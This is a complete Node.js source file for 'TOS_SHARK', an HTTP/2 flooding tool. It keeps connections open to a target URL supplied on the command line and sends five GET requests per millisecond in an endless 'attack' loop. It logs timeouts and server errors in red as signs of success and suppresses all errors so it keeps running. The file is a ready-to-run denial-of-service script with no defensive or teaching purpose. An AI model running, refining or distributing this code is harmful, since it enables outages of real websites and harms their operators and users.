const http2 = require('http2');

class TOS_SHARK {
    constructor(target) {
        const url = new URL(target);
        this.host = url.hostname;
        this.target = target;
        this.running = true;
        this.totalReqs = 0;
        this.startTime = Date.now();
        this.lastLog = Date.now();
        this.reqCounter = 0;
        
        // Manual tracking to prevent leaks
        this.activeRequests = new Set();
        this.timeoutIds = new Set();
        this.lastCleanup = Date.now();
        
        // Connections
        this.conns = [];
        this.maxConns = 3; // Even fewer
        
        console.log(`TØS-SHARK | *.* | MT-3M22`);
        console.log('-----------------------------------------------------------------');
        
        this.start();
    }

    color(t, c) {
        const colors = { r: '\x1b[91m', g: '\x1b[92m', y: '\x1b[93m', x: '\x1b[0m' };
        return `${colors[c] || ''}${t}${colors.x}`;
    }

    start() {
        // Setup minimal connections
        for (let i = 0; i < this.maxConns; i++) {
            this.createConnection();
        }
        
        // Start attack
        this.attackLoop();
        
        // Regular cleanup
        setInterval(() => this.cleanup(), 3000);
        
        process.on('SIGINT', () => {
            this.stop();
            process.exit(0);
        });
    }

    createConnection() {
        try {
            const client = http2.connect(this.target, {
                maxSessionMemory: 2048, // VERY low memory
                maxDeflateDynamicTableSize: 1024
            });
            
            client.setMaxListeners(10);
            
            // Simple error handler
            const errorHandler = () => {
                try { client.destroy(); } catch (e) {}
                setTimeout(() => this.createConnection(), 1000);
            };
            
            client.on('error', errorHandler);
            client.on('close', errorHandler);
            
            this.conns.push(client);
            return client;
            
        } catch (err) {
            setTimeout(() => this.createConnection(), 1000);
        }
    }

    attackLoop() {
        // Use setImmediate instead of promises for cleanup
        const loop = () => {
            if (!this.running) return;
            
            this.cleanup();
            
            // Get active connections
            const active = this.conns.filter(c => c && !c.destroyed && !c.closed);
            
            if (active.length > 0) {
                // Send 5 requests per loop (VERY conservative)
                for (let i = 0; i < 5; i++) {
                    this.sendRequest(active[Math.floor(Math.random() * active.length)]);
                }
            }
            
            // Schedule next iteration
            setTimeout(loop, 1); // 1ms delay
        };
        
        loop();
    }

    sendRequest(client) {
        if (!client || client.destroyed || client.closed) return;
        
        const reqId = ++this.reqCounter;
        this.totalReqs++;
        
        try {
            const req = client.request({
                ':method': 'GET',
                ':path': '/',
                ':authority': this.host
            });
            
            // Track this request
            this.activeRequests.add(req);
            
            // Manual timeout WITHOUT creating promise
            const timeoutId = setTimeout(() => {
                this.logStatus('TIMEOUT');
                try { req.destroy(); } catch (e) {}
                this.activeRequests.delete(req);
                this.timeoutIds.delete(timeoutId);
            }, 3000);
            
            this.timeoutIds.add(timeoutId);
            
            req.on('response', (headers) => {
                clearTimeout(timeoutId);
                this.timeoutIds.delete(timeoutId);
                const status = headers[':status'];
                this.logStatus(status);
                req.destroy();
                this.activeRequests.delete(req);
            });
            
            req.on('error', () => {
                clearTimeout(timeoutId);
                this.timeoutIds.delete(timeoutId);
                this.logStatus('ERROR');
                this.activeRequests.delete(req);
            });
            
            req.on('close', () => {
                clearTimeout(timeoutId);
                this.timeoutIds.delete(timeoutId);
                this.activeRequests.delete(req);
            });
            
            req.end();
            
        } catch (err) {
            this.logStatus('ERROR');
        }
    }

    cleanup() {
        const now = Date.now();
        
        // Clean old timeouts
        if (now - this.lastCleanup > 5000) {
            this.lastCleanup = now;
            
            // Force garbage collection if available
            if (global.gc) {
                global.gc();
            }
            
            // Remove dead connections
            this.conns = this.conns.filter(c => c && !c.destroyed && !c.closed);
            
            // Keep connection count stable
            while (this.conns.length < this.maxConns) {
                this.createConnection();
            }
            
            // Log cleanup
            // console.log(`[~] Cleanup: ${this.activeRequests.size} active, ${this.timeoutIds.size} timeouts`);
        }
    }

    logStatus(status) {
        const now = Date.now();
        if (now - this.lastLog >= 5000) {
            this.lastLog = now;
            
            let color = 'g';
            let text = status;
            
            if (status === 'TIMEOUT') {
                color = 'r';
                text = 'TIMEOUT';
            } else if (typeof status === 'number' && status >= 500) {
                color = 'r';
                text = status;
            } else if (typeof status === 'number' && status >= 400) {
                color = 'y';
                text = status;
            }
            
            console.log(`STS-HAROP-INT ---> ${this.color(text, color)}:0.1s`);
            
            if ((status === 'TIMEOUT' || (typeof status === 'number' && status >= 500)) && color === 'r') {
                console.log(this.color(`{3M22-${this.reqCounter} --> ${text}}`, 'r'));
            }
        }
    }

    stop() {
        this.running = false;
        
        // Cleanup everything manually
        this.activeRequests.forEach(req => {
            try { req.destroy(); } catch (e) {}
        });
        
        this.timeoutIds.forEach(id => {
            clearTimeout(id);
        });
        
        this.conns.forEach(client => {
            try { client.destroy(); } catch (e) {}
        });
        
        this.activeRequests.clear();
        this.timeoutIds.clear();
        this.conns = [];
    }
}

// Run with memory limits
if (require.main === module) {
    // Set memory limits BEFORE requiring anything
    const oldLimit = require('v8').getHeapStatistics().heap_size_limit;
    const newLimit = Math.min(oldLimit, 256 * 1024 * 1024); // 256MB max
    
    // Set flags
    process.env.NODE_OPTIONS = `--max-old-space-size=${Math.floor(newLimit / 1024 / 1024)}`;
    
    // Global error silence
    process.on('uncaughtException', () => {});
    process.on('unhandledRejection', () => {});
    
    if (process.argv.length < 3) {
        console.log('Usage: node TOS.js https://target.com');
        process.exit(1);
    }
    
    // Run with forced GC every 30 seconds
    if (global.gc) {
        setInterval(() => global.gc(), 30000);
    }
    
    new TOS_SHARK(process.argv[2]);
}
